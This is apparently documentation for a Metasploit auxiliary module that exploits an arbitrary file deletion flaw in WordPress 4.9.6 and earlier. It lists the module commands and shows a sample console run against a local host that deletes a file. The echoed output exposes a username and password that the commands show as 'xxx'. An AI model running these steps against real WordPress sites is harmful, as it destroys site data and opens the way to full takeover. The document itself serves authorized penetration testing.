## Description

An arbitrary file deletion vulnerability in the WordPress core allows any user with privileges of an 
Author to completely take over the WordPress site and to execute arbitrary code on the server.
 
## Vulnerable Application

WordPress <= 4.9.6

## Verification Steps

1. Do: ```use auxiliary/scanner/http/wp_arbitrary_file_deletion```
2. Do: ```set USERNAME [USERNAME]```
3. Do: ```set PASSWORD [PASSWORD]```
4. Do: ```set RHOSTS [IP]```
5. Do: ```run```

## Scenarios

```
msf5 > use auxiliary/scanner/http/wp_arbitrary_file_deletion 
msf5 auxiliary(scanner/http/wp_arbitrary_file_deletion) > set VERBOSE true
VERBOSE => true
msf5 auxiliary(scanner/http/wp_arbitrary_file_deletion) > set RPORT 8000
RPORT => 8000
msf5 auxiliary(scanner/http/wp_arbitrary_file_deletion) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf5 auxiliary(scanner/http/wp_arbitrary_file_deletion) > set PASSWORD xxx
PASSWORD => password1
msf5 auxiliary(scanner/http/wp_arbitrary_file_deletion) > set USERNAME xxx
USERNAME => techbrunch
msf5 auxiliary(scanner/http/wp_arbitrary_file_deletion) > run

[*] Checking if target is online and running Wordpress...
[*] Checking access...
[*] Getting the nonce...
[*] Uploading media...
[*] Editing thumb path...
[*] Deleting media...
[+] File deleted!
[*] Auxiliary module execution completed
```